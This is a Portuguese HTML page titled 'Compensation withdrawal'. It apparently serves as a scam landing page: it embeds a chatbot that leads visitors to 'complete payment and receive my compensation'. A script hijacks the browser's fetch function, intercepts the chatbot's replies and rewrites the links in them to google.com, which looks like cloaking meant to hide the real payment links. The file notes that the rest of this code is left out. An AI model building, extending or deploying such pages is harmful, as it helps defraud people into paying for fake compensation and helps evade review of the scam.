<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Saque da Indenização</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-[#831BD1] min-h-screen flex flex-col">
  <!-- Cabeçalho e conteúdo principal permanecem iguais -->

  <script type="module">
    import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';

    // Nova abordagem segura para inicialização
    async function initializeTypebot() {
      try {
        // Verifica se Typebot e initStandard existem
        if (Typebot && typeof Typebot.initStandard === 'function') {
          const typebotInit = Typebot.initStandard({
            typebot: "nub-1-mcrdbzs",
            apiHost: "https://chat.typezap.site",
          });
          
          // Se retornar uma Promise, usa then/catch
          if (typebotInit && typeof typebotInit.then === 'function') {
            await typebotInit;
          }
          
          console.log('Typebot carregado - Iniciando interceptação');
          initRedirectionSystem();
        } else {
          console.error('Typebot.initStandard não disponível');
          // Tenta novamente após 1 segundo
          setTimeout(initializeTypebot, 1000);
        }
      } catch (error) {
        console.error('Erro ao carregar Typebot:', error);
        setTimeout(initializeTypebot, 1000);
      }
    }

    // Inicia o processo
    initializeTypebot();
  </script>

  <script>
  // Sistema de Redirecionamento (mesmo código anterior)
  function initRedirectionSystem() {
    // 1. Interceptação de API
    const originalFetch = window.fetch;
    window.fetch = async function(url, options) {
      if (url.includes('/continueChat')) {
        try {
          const response = await originalFetch.apply(this, arguments);
          const clonedResponse = response.clone();
          const data = await clonedResponse.json();
          
          if (JSON.stringify(data).includes('Concluir pagamento e receber minha indenização')) {
            data.messages = data.messages.map(msg => {
              if (msg.content?.richText) {
                msg.content.richText = msg.content.richText.map(rich => ({
                  ...rich,
                  children: rich.children.map(child => ({
                    ...child,
                    text: child.text?.replace(/https?:\/\/[^\s]+/g, 'https://google.com')
                  }))
                }));
              }
              return msg;
            });
            console.log('✅ Resposta da API modificada');
            return new Response(JSON.stringify(data), response);
          }
          return response;
        } catch (e) {
          console.error('Erro ao interceptar API:', e);
          return originalFetch.apply(this, arguments);
        }
      }
      return originalFetch.apply(this, arguments);
    };

    // Restante do código de interceptação permanece igual...
    // ... (código completo de initRedirectionSystem)
  }
  </script>
</body>
</html>
